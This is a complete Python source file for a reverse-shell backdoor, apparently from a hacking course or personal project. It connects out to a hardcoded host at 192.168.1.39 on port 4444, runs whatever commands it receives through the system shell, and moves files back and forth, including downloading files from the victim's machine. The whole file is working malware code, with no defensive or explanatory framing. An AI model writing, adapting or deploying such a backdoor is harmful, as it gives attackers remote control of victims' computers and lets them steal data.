import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.sock_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock_obj.connect((ip, port))

    def exec_system_cmd(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except:
            return "[+] ERROR - Error during command execution"
    def reliable_send(self, data):
        if not isinstance(data, str):
            data = data.decode('utf-8')
        json_data = json.dumps(data)
        self.sock_obj.send(json_data.encode('utf-8'))
    def reliable_receive(self):
        # json_data = self.sock_obj.recv(1024)
        # return json.loads(json_data.decode('utf-8'))
        json_data = ""
        while True:
            try:
                json_data += self.sock_obj.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except:
                continue

    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to "+path
        except:
            return "[+] ERROR - Invalid directory"


    def write_file(self, name, content):
        with open(name, 'wb') as f_obj:
            f_obj.write(base64.b64decode(content))
            return "[+] File Upload successful."
    
    def read_file(self, path):
        try:
            with open(path, "rb") as f_obj:
                return base64.b64encode(f_obj.read())
        except:
            return "[+]ERROR - Unable to read file"

            
    def run(self):
        while True:
            recv_data = self.reliable_receive()
            if recv_data[0] == "exit":
                self.sock_obj.close()
                exit()
            elif recv_data[0] == "cd" and len(recv_data)>1:
                res = self.change_working_directory_to(recv_data[1])
            elif recv_data[0] == "download":
                res = self.read_file(recv_data[1])
            elif recv_data[0] == "upload":
                res = self.write_file(recv_data[1], recv_data[2])
            else: 
                res = self.exec_system_cmd(recv_data)
            self.reliable_send(res)

backdoor = Backdoor("192.168.1.39",4444)
backdoor.run()